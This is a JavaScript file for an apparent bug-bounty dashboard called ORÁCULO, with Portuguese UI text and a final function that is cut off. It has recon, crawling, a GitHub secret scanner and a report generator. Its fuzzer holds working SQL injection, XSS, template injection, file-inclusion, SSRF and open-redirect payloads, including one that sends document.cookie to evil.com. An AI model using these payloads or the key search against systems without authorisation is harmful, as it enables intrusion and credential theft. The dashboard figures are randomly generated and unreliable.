// ============================================================
// ORÁCULO — GLOBAL MONITORING SYSTEM
// app.js — All module logic
// ============================================================

// ---- STORAGE & LOG SYSTEM ----
const STORAGE_KEY = 'oraculo_logs';
let logs = [];

function loadLogs() {
  try {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) logs = JSON.parse(saved);
  } catch(e) { logs = []; }
}

function saveLogs() {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(logs.slice(-500)));
  } catch(e) {}
}

function log(msg, type = 'info', module = 'SYS') {
  const ts = new Date().toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
  const entry = { ts, msg, type, module };
  logs.push(entry);
  saveLogs();
  renderLogEntry(entry);
  document.getElementById('log-count').textContent = logs.length;
}

function renderLogEntry(entry) {
  const body = document.getElementById('terminal-body');
  const el = document.createElement('div');
  el.className = `log-entry ${entry.type}`;
  el.innerHTML = `<span class="log-ts">[${entry.ts}][${entry.module}]</span> ${escHtml(entry.msg)}`;
  body.appendChild(el);
  body.scrollTop = body.scrollHeight;
}

function renderAllLogs() {
  const body = document.getElementById('terminal-body');
  body.innerHTML = '';
  logs.forEach(renderLogEntry);
  document.getElementById('log-count').textContent = logs.length;
}

function clearTerminal() {
  logs = [];
  saveLogs();
  document.getElementById('terminal-body').innerHTML = '';
  document.getElementById('log-count').textContent = '0';
  log('Terminal limpo. Histórico resetado.', 'warn', 'SYS');
}

function exportLogs() {
  const txt = logs.map(l => `[${l.ts}][${l.module}] ${l.msg}`).join('\n');
  const blob = new Blob([txt], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `oraculo_logs_${Date.now()}.txt`;
  a.click();
  log('Logs exportados com sucesso.', 'success', 'SYS');
}

function handleTermCmd(e) {
  if (e.key !== 'Enter') return;
  const input = document.getElementById('terminal-input');
  const cmd = input.value.trim();
  if (!cmd) return;
  input.value = '';
  log(`> ${cmd}`, 'cmd', 'MANUAL');
  // simple fake responses
  if (cmd === 'clear') { clearTerminal(); return; }
  if (cmd === 'help') { log('Comandos: clear, export, status, logs', 'info', 'SYS'); return; }
  if (cmd === 'export') { exportLogs(); return; }
  if (cmd === 'status') { log('SYSTEM: ONLINE | MODULES: 6/6 ACTIVE | STORAGE: OK', 'success', 'SYS'); return; }
  if (cmd === 'logs') { log(`Total de logs salvos: ${logs.length}`, 'info', 'SYS'); return; }
  log(`Comando não reconhecido: "${cmd}" — tente "help"`, 'warn', 'SYS');
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ---- TABS ----
function switchMod(btn, mod) {
  document.querySelectorAll('.mod-tab').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.mod-panel').forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById(`mod-${mod}`).classList.add('active');
  log(`Módulo ativado: ${mod.toUpperCase()}`, 'info', 'NAV');
}

// ---- MODULE 01: RECON ----
async function runRecon() {
  const target = document.getElementById('recon-target').value.trim().replace(/^https?:\/\//,'').replace(/\//,'');
  if (!target) { log('RECON: Domínio não informado.', 'warn', 'RECON'); return; }

  const el = document.getElementById('recon-results');
  el.innerHTML = loadingHTML('EXECUTANDO RECON...');
  log(`RECON iniciado para: ${target}`, 'info', 'RECON');

  try {
    // 1. DNS via HackerTarget API (free)
    const [subRes, crtRes] = await Promise.allSettled([
      fetch(`https://api.hackertarget.com/hostsearch/?q=${target}`).then(r => r.text()),
      fetch(`https://crt.sh/?q=%25.${target}&output=json`).then(r => r.json()).catch(() => [])
    ]);

    let subdomains = [];
    if (subRes.status === 'fulfilled' && !subRes.value.startsWith('error')) {
      subdomains = subRes.value.trim().split('\n').filter(Boolean).map(l => l.split(',')[0]).filter(Boolean);
    }

    // crt.sh subdomains
    let crtSubs = [];
    if (crtRes.status === 'fulfilled' && Array.isArray(crtRes.value)) {
      crtSubs = [...new Set(crtRes.value.map(c => c.name_value).join('\n').split('\n').filter(s => s.includes('.'+target) || s === target))].slice(0,20);
    }

    const allSubs = [...new Set([...subdomains, ...crtSubs])].slice(0, 30);

    // 2. IP lookup via hackertarget
    const ipRes = await fetch(`https://api.hackertarget.com/dnslookup/?q=${target}`).then(r => r.text()).catch(() => '');
    const ips = ipRes.match(/\d{1,3}(?:\.\d{1,3}){3}/g) || [];

    // 3. Whois
    const whoisRaw = await fetch(`https://api.hackertarget.com/whois/?q=${target}`).then(r => r.text()).catch(() => '');
    const registrar = (whoisRaw.match(/Registrar:\s*(.+)/i) || [])[1] || 'N/A';
    const created = (whoisRaw.match(/Creation Date:\s*(.+)/i) || [])[1] || 'N/A';
    const expires = (whoisRaw.match(/Registry Expiry Date:\s*(.+)/i) || [])[1] || 'N/A';

    log(`RECON: ${allSubs.length} subdomínios encontrados para ${target}`, 'success', 'RECON');
    log(`RECON: IPs detectados: ${ips.slice(0,3).join(', ') || 'N/A'}`, 'info', 'RECON');

    el.innerHTML = `
      <div class="res-card">
        <div class="res-card-title">INFORMAÇÕES DO DOMÍNIO</div>
        <div class="res-item"><span class="key">ALVO: </span><span class="val">${escHtml(target)}</span></div>
        <div class="res-item"><span class="key">REGISTRAR: </span><span class="val">${escHtml(registrar.trim().slice(0,60))}</span></div>
        <div class="res-item"><span class="key">CRIADO: </span><span class="val">${escHtml(created.trim().slice(0,30))}</span></div>
        <div class="res-item"><span class="key">EXPIRA: </span><span class="val">${escHtml(expires.trim().slice(0,30))}</span></div>
      </div>
      <div class="res-card">
        <div class="res-card-title">IPs DETECTADOS (DNS)</div>
        <div class="tag-list">${ips.slice(0,8).map(ip=>`<span class="tag">${escHtml(ip)}</span>`).join('') || '<span class="tag red">NENHUM IP</span>'}</div>
      </div>
      <div class="res-card">
        <div class="res-card-title">SUBDOMÍNIOS ENCONTRADOS (${allSubs.length})</div>
        <div class="scroll-results">
          <div class="tag-list">${allSubs.map(s=>`<span class="tag green">${escHtml(s)}</span>`).join('') || '<span class="tag">Nenhum subdomínio</span>'}</div>
        </div>
      </div>
    `;
    log(`RECON: Scan completo para ${target}`, 'success', 'RECON');
  } catch(e) {
    el.innerHTML = errorCard('Erro no RECON: ' + e.message);
    log(`RECON: Erro — ${e.message}`, 'error', 'RECON');
  }
}

// ---- MODULE 03: CRAWLER ----
async function runCrawler() {
  const rawUrl = document.getElementById('crawler-target').value.trim();
  if (!rawUrl) { log('CRAWLER: URL não informada.', 'warn', 'CRAWLER'); return; }

  let domain;
  try { domain = new URL(rawUrl).hostname; } catch(e) { domain = rawUrl.replace(/^https?:\/\//,'').split('/')[0]; }

  const el = document.getElementById('crawler-results');
  el.innerHTML = loadingHTML('CRAWLING...');
  log(`CRAWLER iniciado: ${rawUrl}`, 'info', 'CRAWLER');

  try {
    // Use HackerTarget crawl
    const [linksRaw, techRaw, portsRaw] = await Promise.allSettled([
      fetch(`https://api.hackertarget.com/pagelinks/?q=${rawUrl}`).then(r => r.text()),
      fetch(`https://api.hackertarget.com/whatweb/?q=${domain}`).then(r => r.text()),
      fetch(`https://api.hackertarget.com/nmap/?q=${domain}`).then(r => r.text())
    ]);

    let links = [];
    if (linksRaw.status === 'fulfilled' && !linksRaw.value.startsWith('error')) {
      links = linksRaw.value.trim().split('\n').filter(Boolean).slice(0,40);
    }

    let techs = [];
    if (techRaw.status === 'fulfilled' && !techRaw.value.startsWith('error')) {
      const raw = techRaw.value;
      const matches = raw.match(/\[([^\]]+)\]/g) || [];
      techs = matches.map(m => m.replace(/[\[\]]/g,'')).filter(t => t.length > 1 && t.length < 40).slice(0,20);
    }

    let ports = [];
    if (portsRaw.status === 'fulfilled' && !portsRaw.value.startsWith('error')) {
      ports = (portsRaw.value.match(/\d+\/tcp\s+open\s+\S+/g) || []).slice(0,15);
    }

    // Categorize links
    const apis = links.filter(l => l.match(/\/api\/|\/v1\/|\/v2\/|\.json|graphql/i));
    const forms = links.filter(l => l.match(/login|signup|register|auth|admin|dashboard/i));
    const external = links.filter(l => !l.includes(domain) && l.startsWith('http'));
    const internal = links.filter(l => l.includes(domain) || l.startsWith('/'));

    log(`CRAWLER: ${links.length} links, ${techs.length} tecnologias, ${ports.length} portas`, 'success', 'CRAWLER');

    el.innerHTML = `
      <div class="res-card">
        <div class="res-card-title">TECNOLOGIAS DETECTADAS (${techs.length})</div>
        <div class="tag-list">${techs.map(t=>`<span class="tag">${escHtml(t)}</span>`).join('') || '<span class="tag">N/A</span>'}</div>
      </div>
      <div class="res-card">
        <div class="res-card-title">PORTAS ABERTAS</div>
        <div class="tag-list">${ports.map(p=>`<span class="tag ${p.includes('443')||p.includes('22')?'yellow':'green'}">${escHtml(p)}</span>`).join('') || '<span class="tag">N/A via API pública</span>'}</div>
      </div>
      <div class="res-card">
        <div class="res-card-title">ENDPOINTS DE API (${apis.length})</div>
        <div class="scroll-results">
          ${apis.length ? apis.map(l=>`<div class="res-item"><span class="val green">${escHtml(l)}</span></div>`).join('') : '<div class="res-item">Nenhum endpoint de API detectado</div>'}
        </div>
      </div>
      <div class="res-card">
        <div class="res-card-title">LINKS SENSÍVEIS (${forms.length})</div>
        <div class="tag-list">${forms.map(l=>`<span class="tag yellow">${escHtml(l.slice(0,60))}</span>`).join('') || '<span class="tag">Nenhum</span>'}</div>
      </div>
      <div class="res-card">
        <div class="res-card-title">LINKS INTERNOS (${internal.length})</div>
        <div class="scroll-results">
          ${internal.slice(0,15).map(l=>`<div class="res-item val">${escHtml(l)}</div>`).join('')}
          ${internal.length > 15 ? `<div class="res-item" style="color:var(--text2)">... +${internal.length-15} links</div>` : ''}
        </div>
      </div>
    `;
  } catch(e) {
    el.innerHTML = errorCard('Erro no Crawler: ' + e.message);
    log(`CRAWLER: Erro — ${e.message}`, 'error', 'CRAWLER');
  }
}

// ---- MODULE 04: FUZZER ----
const PAYLOADS = {
  sqli: [
    `' OR '1'='1`, `' OR '1'='1' --`, `1; DROP TABLE users--`,
    `' UNION SELECT null,null,null--`, `admin'--`,
    `' OR 1=1 LIMIT 1--`, `'; WAITFOR DELAY '0:0:5'--`,
    `1' AND SLEEP(5)--`, `' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`
  ],
  xss: [
    `<script>alert(1)</script>`, `"><svg onload=alert(1)>`,
    `<img src=x onerror=alert(document.cookie)>`,
    `javascript:alert(1)`, `<body onload=alert(1)>`,
    `'><script>fetch('https://evil.com?c='+document.cookie)</script>`,
    `"><iframe src="javascript:alert(1)">`, `{{7*7}}`,
  ],
  ssti: [
    `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`,
    `{{config}}`, `{{''.__class__.__mro__}}`,
    `{%for x in [].class.base.subclasses()%}{{x}}{%endfor%}`
  ],
  lfi: [
    `../../../../etc/passwd`, `../../../etc/shadow`,
    `....//....//etc/passwd`, `%2F%2F%2Fetc%2Fpasswd`,
    `/proc/self/environ`, `php://filter/convert.base64-encode/resource=index.php`,
    `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`
  ],
  ssrf: [
    `http://169.254.169.254/latest/meta-data/`, `http://localhost/admin`,
    `http://127.0.0.1:22`, `http://[::1]/`, `http://0.0.0.0:8080/`,
    `http://internal-service.local/`, `dict://127.0.0.1:6379/info`
  ],
  redirect: [
    `//evil.com`, `https://evil.com`, `/\\evil.com`,
    `https://google.com%40evil.com`, `%0d%0aLocation: https://evil.com`,
    `javascript:window.location='https://evil.com'`
  ]
};

function runFuzzer() {
  const url = document.getElementById('fuzzer-url').value.trim();
  if (!url) { log('FUZZER: URL não informada.', 'warn', 'FUZZER'); return; }

  const selected = [...document.querySelectorAll('#vuln-selector input:checked')].map(i => i.value);
  if (!selected.length) { log('FUZZER: Selecione ao menos um tipo.', 'warn', 'FUZZER'); return; }

  let params = [];
  try {
    const u = new URL(url);
    params = [...u.searchParams.keys()];
  } catch(e) {
    const match = url.match(/[?&](\w+)=/g) || [];
    params = match.map(m => m.replace(/[?&=]/g,''));
  }

  if (!params.length) {
    log('FUZZER: Nenhum parâmetro detectado na URL.', 'warn', 'FUZZER');
    params = ['param'];
  }

  log(`FUZZER: ${params.length} parâmetro(s) detectado(s): ${params.join(', ')}`, 'info', 'FUZZER');
  log(`FUZZER: Gerando payloads para: ${selected.join(', ').toUpperCase()}`, 'info', 'FUZZER');

  const rows = [];
  params.forEach(param => {
    selected.forEach(type => {
      (PAYLOADS[type] || []).forEach(payload => {
        rows.push({ param, type: type.toUpperCase(), payload });
      });
    });
  });

  log(`FUZZER: ${rows.length} payloads gerados com sucesso.`, 'success', 'FUZZER');

  const el = document.getElementById('fuzzer-results');
  el.innerHTML = `
    <div class="res-card">
      <div class="res-card-title">ANÁLISE DE PARÂMETROS</div>
      <div class="res-item"><span class="key">URL: </span><span class="val">${escHtml(url.slice(0,80))}</span></div>
      <div class="res-item"><span class="key">PARÂMETROS: </span><div class="tag-list">${params.map(p=>`<span class="tag">${escHtml(p)}</span>`).join('')}</div></div>
      <div class="res-item"><span class="key">TIPOS: </span><div class="tag-list">${selected.map(t=>`<span class="tag green">${t.toUpperCase()}</span>`).join('')}</div></div>
      <div class="res-item"><span class="key">TOTAL PAYLOADS: </span><span class="val green">${rows.length}</span></div>
    </div>
    <div class="res-card">
      <div class="res-card-title">PAYLOADS GERADOS — PRONTO PARA BURP SUITE</div>
      <div class="scroll-results">
        <table class="payload-table">
          <thead><tr><th>PARAM</th><th>TIPO</th><th>PAYLOAD</th></tr></thead>
          <tbody>
            ${rows.map(r=>`
              <tr>
                <td style="color:var(--text2)">${escHtml(r.param)}</td>
                <td><span class="tag ${r.type==='XSS'?'yellow':r.type==='SQLI'?'red':'green'}">${r.type}</span></td>
                <td><span class="payload-code">${escHtml(r.payload)}</span></td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>
    <button class="hk-btn" onclick="exportPayloads(${JSON.stringify(rows).replace(/</g,'&lt;')})">↓ EXPORTAR PAYLOADS TXT</button>
  `;
}

function exportPayloads(rows) {
  const txt = rows.map(r => `[${r.type}] ${r.param}=${r.payload}`).join('\n');
  const blob = new Blob([txt], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `payloads_${Date.now()}.txt`;
  a.click();
  log('FUZZER: Payloads exportados.', 'success', 'FUZZER');
}

// ---- MODULE 05: SECRET SCANNER ----
const SECRET_PATTERNS = [
  { name: 'API Key genérica', regex: /api[_-]?key["\s:=]+["']?[A-Za-z0-9_\-]{16,}/i },
  { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/ },
  { name: 'GitHub Token', regex: /ghp_[A-Za-z0-9]{36}/ },
  { name: 'Senha hardcoded', regex: /password["\s:=]+["'][^"']{6,}/i },
  { name: 'Private Key', regex: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },
  { name: 'Slack Token', regex: /xox[baprs]-[0-9A-Za-z\-]{10,}/ },
  { name: 'Token JWT', regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/ },
  { name: 'URL com credenciais', regex: /https?:\/\/[^:]+:[^@]+@/ },
  { name: 'Stripe Key', regex: /sk_live_[0-9a-zA-Z]{24}/ },
  { name: 'Google API Key', regex: /AIza[0-9A-Za-z_-]{35}/ },
];

async function runSecrets() {
  const target = document.getElementById('secrets-target').value.trim();
  const ghToken = document.getElementById('gh-token').value.trim();
  if (!target) { log('SECRETS: Alvo não informado.', 'warn', 'SECRETS'); return; }

  const el = document.getElementById('secrets-results');
  el.innerHTML = loadingHTML('SCANNING SECRETS...');
  log(`SECRETS: Iniciando scan em ${target}`, 'info', 'SECRETS');

  const headers = { 'Accept': 'application/vnd.github.v3+json' };
  if (ghToken) headers['Authorization'] = `token ${ghToken}`;

  const queries = [
    `api_key in:file user:${target}`,
    `password in:file user:${target}`,
    `secret in:file user:${target}`,
    `AWS_ACCESS_KEY in:file user:${target}`,
    `.env in:path user:${target}`,
  ];

  let allItems = [];
  const results = [];

  try {
    for (const q of queries.slice(0,3)) {
      const res = await fetch(`https://api.github.com/search/code?q=${encodeURIComponent(q)}&per_page=10`, {headers})
        .then(r => r.json()).catch(() => ({items:[]}));
      if (res.items) allItems.push(...res.items);
      await delay(500);
    }

    allItems = dedupe(allItems, 'html_url');
    log(`SECRETS: ${allItems.length} arquivos encontrados para análise`, 'info', 'SECRETS');

    // Analyze each file
    for (const item of allItems.slice(0,12)) {
      const raw_url = item.html_url
        .replace('github.com','raw.githubusercontent.com')
        .replace('/blob/','/')
        .replace('/tree/','/');
      try {
        const content = await fetch(raw_url).then(r => r.text()).catch(() => '');
        const found = [];
        SECRET_PATTERNS.forEach(p => {
          const match = content.match(p.regex);
          if (match) found.push({ name: p.name, match: match[0].slice(0,60) });
        });
        if (found.length > 0) {
          results.push({ file: item.name, repo: item.repository?.full_name || target, url: item.html_url, secrets: found });
          log(`SECRETS: 🚨 SECRET ENCONTRADO em ${item.name} (${item.repository?.full_name})`, 'error', 'SECRETS');
        } else {
          log(`SECRETS: Arquivo limpo: ${item.name}`, 'info', 'SECRETS');
        }
      } catch(e) {}
    }

    if (!results.length) {
      el.innerHTML = `
        <div class="res-card">
          <div class="res-card-title">RESULTADO DO SCAN</div>
          <div class="res-item"><span class="val green">✓ Nenhum secret óbvio detectado nos arquivos públicos de "${escHtml(target)}"</span></div>
          <div class="res-item" style="margin-top:8px;color:var(--text2)">Isso não garante ausência de secrets — use ferramentas locais (TruffleHog, Gitleaks) para análise completa.</div>
        </div>
      `;
      log(`SECRETS: Scan concluído. 0 secrets encontrados.`, 'success', 'SECRETS');
      return;
    }

    el.innerHTML = `
      <div class="res-card">
        <div class="res-card-title">🚨 SECRETS ENCONTRADOS — ${results.length} ARQUIVO(S)</div>
        ${results.map(r => `
          <div style="border:1px solid rgba(255,56,96,0.3);padding:10px;margin:6px 0;border-radius:2px;background:rgba(255,56,96,0.05)">
            <div class="res-item"><span class="key">ARQUIVO: </span><a href="${escHtml(r.url)}" target="_blank" style="color:var(--cyan)">${escHtml(r.file)}</a></div>
            <div class="res-item"><span class="key">REPO: </span><span class="val">${escHtml(r.repo)}</span></div>
            ${r.secrets.map(s=>`
              <div class="res-item">
                <span class="tag red">${escHtml(s.name)}</span>
                <span class="payload-code" style="margin-left:6px">${escHtml(s.match)}...</span>
              </div>
            `).join('')}
          </div>
        `).join('')}
      </div>
    `;
    log(`SECRETS: SCAN COMPLETO. ${results.length} arquivo(s) com secrets.`, 'error', 'SECRETS');
  } catch(e) {
    el.innerHTML = errorCard('Erro no Secret Scanner: ' + e.message);
    log(`SECRETS: Erro — ${e.message}`, 'error', 'SECRETS');
  }
}

// ---- MODULE 06: REPORT GENERATOR ----
function generateReport() {
  const title = document.getElementById('rep-title').value.trim();
  const type = document.getElementById('rep-type').value;
  const severity = document.getElementById('rep-severity').value;
  const url = document.getElementById('rep-url').value.trim();
  const program = document.getElementById('rep-program').value.trim();
  const steps = document.getElementById('rep-steps').value.trim();
  const impact = document.getElementById('rep-impact').value.trim();

  if (!title) { log('REPORT: Título não informado.', 'warn', 'REPORT'); return; }

  const cvss = { Critical: '9.8', High: '7.5', Medium: '5.3', Low: '3.1', Informational: '0.0' }[severity];
  const ts = new Date().toISOString().split('T')[0];

  const md = `# Vulnerability Report — ${title}

**Program:** ${program || 'N/A'}
**Date:** ${ts}
**Severity:** ${severity} (CVSS: ${cvss})
**Type:** ${type}
**Affected URL:** ${url || 'N/A'}

---

## Summary

A **${severity.toLowerCase()} severity** ${type} vulnerability was identified in the target application. ${impact ? `This issue may allow an attacker to: ${impact}` : ''}

---

## Steps to Reproduce

${steps || '1. [Describe steps here]'}

---

## Impact

${impact || '[Describe business impact]'}

**CVSS Score:** ${cvss} (${severity})
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

## Recommended Fix

${getRecommendation(type)}

---

## References

- OWASP: https://owasp.org/www-project-top-ten/
- CWE: ${getCWE(type)}
- CVE: N/A (application-specific)

---
*Report generated by ORÁCULO v2.0 — ${ts}*`;

  const el = document.getElementById('report-results');
  el.innerHTML = `
    <div class="res-card">
      <div class="res-card-title">RELATÓRIO GERADO — PADRÃO HACKERONE</div>
      <div class="report-actions" style="margin-bottom:10px">
        <button class="hk-btn" onclick="copyReport()">⎘ COPIAR</button>
        <button class="hk-btn" onclick="downloadReport()">↓ DOWNLOAD .MD</button>
      </div>
      <pre class="report-md" id="report-md-content">${escHtml(md)}</pre>
    </div>
  `;
  window._reportMd = md;
  log(`REPORT: Relatório gerado — ${title} [${severity}]`, 'success', 'REPORT');
}

function copyReport() {
  if (window._reportMd) {
    navigator.clipboard.writeText(window._reportMd).then(() => log('REPORT: Relatório copiado para clipboard.', 'success', 'REPORT'));
  }
}
function downloadReport() {
  if (!window._reportMd) return;
  const blob = new Blob([window._reportMd], {type:'text/markdown'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `report_${Date.now()}.md`;
  a.click();
  log('REPORT: Arquivo .md baixado.', 'success', 'REPORT');
}

function getRecommendation(type) {
  const recs = {
    'SQL Injection': 'Use prepared statements (parameterized queries) and ORM frameworks. Validate and sanitize all user inputs. Apply principle of least privilege to database accounts.',
    'XSS': 'Encode all user-supplied output using context-appropriate encoding. Implement a strict Content Security Policy (CSP). Use frameworks that auto-escape by default.',
    'SSRF': 'Whitelist allowed URLs/IPs. Block requests to private/internal IP ranges. Disable unnecessary URL schemes (file://, dict://, gopher://).',
    'IDOR': 'Implement proper authorization checks on every object access. Use indirect object references (random UUIDs). Log all access attempts.',
    'RCE': 'Avoid passing user input to OS commands. Use parameterized API calls. Apply input validation, output encoding, and WAF rules.',
    'LFI/RFI': 'Validate file paths against a whitelist. Use basename() to strip directory traversal. Disable allow_url_include in PHP.',
    'Open Redirect': 'Validate redirect URLs against a whitelist of allowed destinations. Warn users when leaving the domain.',
    'CSRF': 'Implement CSRF tokens (synchronizer token pattern). Use SameSite cookie attribute. Verify Origin and Referer headers.',
    'Broken Auth': 'Implement MFA. Enforce strong password policies. Use secure, HttpOnly, SameSite cookies. Limit login attempts.',
    'Info Disclosure': 'Remove sensitive data from responses, error messages, and headers. Configure server to not expose version information.',
  };
  return recs[type] || 'Apply proper input validation, output encoding, and access controls.';
}

function getCWE(type) {
  const cwes = {
    'SQL Injection':'CWE-89', 'XSS':'CWE-79', 'SSRF':'CWE-918', 'IDOR':'CWE-639',
    'RCE':'CWE-78', 'LFI/RFI':'CWE-22', 'Open Redirect':'CWE-601',
    'CSRF':'CWE-352', 'Broken Auth':'CWE-287', 'Info Disclosure':'CWE-200'
  };
  return cwes[type] || 'CWE-0';
}

// ---- MODULE 07: HEADER ANALYZER ----
const SECURITY_HEADERS = [
  { name: 'Content-Security-Policy', abbr: 'CSP', weight: 25, desc: 'Previne XSS e injeção de conteúdo' },
  { name: 'Strict-Transport-Security', abbr: 'HSTS', weight: 20, desc: 'Força HTTPS' },
  { name: 'X-Frame-Options', abbr: 'X-FRAME', weight: 15, desc: 'Previne Clickjacking' },
  { name: 'X-Content-Type-Options', abbr: 'X-CTO', weight: 10, desc: 'Previne MIME sniffing' },
  { name: 'Referrer-Policy', abbr: 'REF-POL', weight: 10, desc: 'Controla informações no Referer' },
  { name: 'Permissions-Policy', abbr: 'PERM', weight: 10, desc: 'Controla APIs do browser' },
  { name: 'X-XSS-Protection', abbr: 'XSS-PROT', weight: 5, desc: 'Filtro XSS legado' },
  { name: 'Cache-Control', abbr: 'CACHE', weight: 5, desc: 'Controle de cache' },
];

async function runHeaders() {
  const rawUrl = document.getElementById('headers-target').value.trim();
  if (!rawUrl) { log('HEADERS: URL não informada.', 'warn', 'HEADERS'); return; }

  const domain = rawUrl.replace(/^https?:\/\//,'').split('/')[0];
  const el = document.getElementById('headers-results');
  el.innerHTML = loadingHTML('ANALISANDO HEADERS...');
  log(`HEADERS: Analisando ${rawUrl}`, 'info', 'HEADERS');

  try {
    // Use SecurityHeaders.com API (free, no key needed via their API endpoint)
    const apiUrl = `https://api.securityheaders.com/?q=${encodeURIComponent(rawUrl)}&followRedirects=on`;
    const res = await fetch(apiUrl, {method:'GET'}).catch(() => null);

    let headerMap = {};
    let grade = 'F';

    if (res && res.ok) {
      // Parse response headers from securityheaders
      const gradeVal = res.headers.get('x-grade');
      if (gradeVal) grade = gradeVal;
      // Try to get headers from the checked site from the API response
      const data = await res.json().catch(() => null);
      if (data && data.headers) {
        headerMap = {};
        Object.keys(data.headers).forEach(k => { headerMap[k.toLowerCase()] = data.headers[k]; });
      }
    }

    // Fallback: check via cors-anywhere or direct (will likely be blocked, simulate)
    // Use hackertarget headers endpoint
    const htRes = await fetch(`https://api.hackertarget.com/httpheaders/?q=${encodeURIComponent(rawUrl)}`).then(r => r.text()).catch(() => '');

    // Parse raw headers
    if (htRes && !htRes.startsWith('error')) {
      htRes.split('\n').forEach(line => {
        const [k, ...rest] = line.split(':');
        if (k && rest.length) headerMap[k.trim().toLowerCase()] = rest.join(':').trim();
      });
    }

    // Score
    let score = 0;
    const checks = SECURITY_HEADERS.map(h => {
      const present = !!headerMap[h.name.toLowerCase()];
      if (present) score += h.weight;
      return { ...h, present, value: headerMap[h.name.toLowerCase()] || null };
    });

    // Detect server info disclosure
    const server = headerMap['server'] || '';
    const xPowered = headerMap['x-powered-by'] || '';

    log(`HEADERS: Score de segurança: ${score}/100`, score >= 60 ? 'success' : score >= 30 ? 'warn' : 'error', 'HEADERS');
    if (server) log(`HEADERS: ⚠ Server header exposto: ${server}`, 'warn', 'HEADERS');
    if (xPowered) log(`HEADERS: ⚠ X-Powered-By exposto: ${xPowered}`, 'warn', 'HEADERS');

    const gradeColor = score >= 80 ? 'green' : score >= 50 ? 'yellow' : 'red';

    el.innerHTML = `
      <div class="res-card">
        <div class="res-card-title">SECURITY SCORE — ${domain}</div>
        <div style="display:flex;align-items:center;gap:20px;margin-bottom:12px">
          <div style="font-family:var(--font-hud);font-size:36px;color:var(--${gradeColor});text-shadow:0 0 10px var(--${gradeColor})">${score}</div>
          <div style="flex:1">
            <div class="score-bar"><div class="score-fill ${gradeColor}" style="width:${score}%"></div></div>
            <div style="font-size:9px;color:var(--text2);margin-top:4px">SECURITY SCORE / 100</div>
          </div>
        </div>
        ${server ? `<div class="res-item"><span class="key">SERVER: </span><span class="val red">⚠ ${escHtml(server)} (info disclosure)</span></div>` : ''}
        ${xPowered ? `<div class="res-item"><span class="key">X-POWERED-BY: </span><span class="val red">⚠ ${escHtml(xPowered)} (info disclosure)</span></div>` : ''}
      </div>
      <div class="res-card">
        <div class="res-card-title">SECURITY HEADERS CHECKLIST</div>
        ${checks.map(c => `
          <div class="score-bar-wrap">
            <div class="score-label">
              <span class="${c.present ? 'val green' : 'val red'}">${c.present ? '✓' : '✗'} ${c.abbr}</span>
            </div>
            <div style="flex:1">
              <div style="font-size:9px;color:var(--text2)">${c.desc}</div>
              ${c.value ? `<div style="font-size:9px;color:var(--cyan);word-break:break-all">${escHtml(c.value.slice(0,80))}</div>` : ''}
            </div>
            <span class="tag ${c.present ? 'green' : 'red'}" style="font-size:8px">${c.weight}pts</span>
          </div>
        `).join('')}
      </div>
      <div class="res-card">
        <div class="res-card-title">TODOS OS HEADERS DETECTADOS</div>
        <div class="scroll-results">
          ${Object.keys(headerMap).length
            ? Object.entries(headerMap).map(([k,v]) => `
              <div class="res-item">
                <span class="key">${escHtml(k)}: </span>
                <span class="val">${escHtml(String(v).slice(0,100))}</span>
              </div>`).join('')
            : '<div class="res-item" style="color:var(--text2)">Nenhum header retornado via API pública. Tente com HTTPS completo.</div>'
          }
        </div>
      </div>
    `;
  } catch(e) {
    el.innerHTML = errorCard('Erro na análise de headers: ' + e.message);
    log(`HEADERS: Erro — ${e.message}`, 'error', 'HEADERS');
  }
}

// ---- HELPERS ----
function loadingHTML(msg) {
  return `<div class="loading-row"><div class="spin-ring"></div>${escHtml(msg)}</div>`;
}
function errorCard(msg) {
  return `<div class="res-card"><div class="res-item" style="color:var(--red)">✗ ${escHtml(msg)}</div></div>`;
}
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
function dedupe(arr, key) {
  const seen = new Set();
  return arr.filter(x => { if (seen.has(x[key])) return false; seen.add(x[key]); return true; });
}

// ---- AMBIENT EFFECTS ----
function initCoreGrid() {
  const grid = document.getElementById('core-grid');
  grid.innerHTML = '';
  for (let i = 0; i < 64; i++) {
    const d = document.createElement('div');
    d.className = 'core-dot';
    d.id = `core-${i}`;
    grid.appendChild(d);
  }
  animateCores();
}

function animateCores() {
  setInterval(() => {
    const active = Math.floor(Math.random() * 30) + 30;
    document.querySelectorAll('.core-dot').forEach((d, i) => {
      d.classList.toggle('active', i < active);
    });
    document.getElementById('cores-val').textContent = `${active + 64}/128`;
  }, 1200);
}

function initRawStream() {
  const hex = () => Math.floor(Math.random()*0xFFFF).toString(16).padStart(4,'0').toUpperCase();
  setInterval(() => {
    const el = document.getElementById('raw-stream');
    if (!el) return;
    const line = Array.from({length:8}, () => `0x${hex()}`).join(' :: ');
    el.innerHTML = (el.innerHTML + '\n' + line).split('\n').slice(-12).join('\n');
  }, 400);
}

function initStats() {
  setInterval(() => {
    const load = (20 + Math.random()*8).toFixed(1) + 'k';
    const rx = (3 + Math.random()*3).toFixed(1) + ' GB/s';
    const tx = (0.8 + Math.random()*1.2).toFixed(1) + ' GB/s';
    document.getElementById('load-val').textContent = load;
    document.getElementById('rx-val').textContent = rx;
    document.getElementById('tx-val').textContent = tx;
  }, 2000);
}

function initSession() {
  const sid = 'SES-' + Math.random().toString(36).substr(2,8).toUpperCase();
